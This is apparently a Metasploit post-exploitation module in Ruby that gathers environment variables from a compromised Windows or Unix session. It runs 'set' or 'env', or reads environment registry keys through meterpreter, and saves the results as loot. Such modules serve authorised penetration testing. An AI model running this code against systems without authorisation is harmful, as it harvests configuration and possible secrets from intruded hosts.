##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Multi Gather Generic Operating System Environment Settings',
      'Description'   => %q{ This module prints out the operating system environment variables },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>', 'egypt' ],
      'Platform'      => %w{ linux win },
      'SessionTypes'  => [ 'shell', 'meterpreter' ]
    ))
    @ltype = 'generic.environment'
  end

  def run
    case session.type
    when "shell"
      get_env_shell
    when "meterpreter"
      get_env_meterpreter
    end
    store_loot(@ltype, "text/plain", session, @output) if @output
    print_line @output if @output
  end

  def get_env_shell
    print_line @output if @output
    if session.platform == 'windows'
      @ltype = "windows.environment"
      cmd = "set"
    else
      @ltype = "unix.environment"
      cmd = "env"
    end
    @output = cmd_exec(cmd)
  end

  def get_env_meterpreter
    case session.platform
    when 'windows'
      var_names = []
      var_names << registry_enumvals("HKEY_CURRENT_USER\\Volatile Environment")
      var_names << registry_enumvals("HKEY_CURRENT_USER\\Environment")
      var_names << registry_enumvals("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment")
      output = []
      var_names.delete(nil)
      session.sys.config.getenvs(*var_names.flatten.uniq.sort).each do |k, v|
        output << "#{k}=#{v}"
      end
      @output = output.join("\n")
      @ltype = "windows.environment"
    else
      # Don't know what it is, hope it's unix
      print_status sysinfo["OS"]
      chan = session.sys.process.execute("/bin/sh", "-c env", {"Channelized" => true})
      @output = chan.read
      @ltype = "unix.environment"
    end
  end
end
